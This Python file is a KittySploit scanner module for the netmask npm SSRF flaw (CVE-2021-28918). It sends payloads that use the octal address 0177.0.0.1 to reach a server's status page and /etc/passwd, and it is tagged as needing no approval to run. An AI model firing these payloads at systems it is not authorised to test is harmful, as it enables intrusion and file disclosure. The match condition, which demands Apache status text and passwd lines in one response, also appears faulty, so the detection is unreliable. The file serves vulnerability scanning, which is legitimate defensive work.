#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Netmask NPM Package is susceptible to server-side request forgery because of improper input validation of octa."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netmask NPM Package - Server-Side Request Forgery Detection',
        'description': 'Netmask NPM Package is susceptible to server-side request forgery because of improper input validation of octal strings in netmask npm package. This allows unauthenticated remote attackers to perform indeterminate SSRF, remote file inclusion, and local file inclusion attacks on many of the dependent packages. A remote unauthenticated attacker can bypass packages relying on netmask to filter IPs and reach critical VPN or LAN hosts.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'npm', 'netmask', 'ssrf', 'lfi', 'netmask_project', 'node.js', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md',
            'https://github.com/advisories/GHSA-pch5-whg9-qr2r',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-28918',
            'https://github.com/rs/node-netmask',
            'https://rootdaemon.com/2021/03/29/vulnerability-in-netmask-npm-package-affects-280000-projects/',
        ],
        'cve': 'CVE-2021-28918',
    }

    def run(self):
        for path in ('/?url=http://0177.0.0.1/server-status', '/?host=http://0177.0.0.1/server-status', '/?file=http://0177.0.0.1/etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('Apache Server Status', 'Server Version',)
            body_regexes = ('root:.*:0:0:',)
            if (all(m in body for m in body_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='critical',
                    reason="Netmask NPM Package - Server-Side Request Forgery detected",
                    path=path,
                )
                return True
        return False

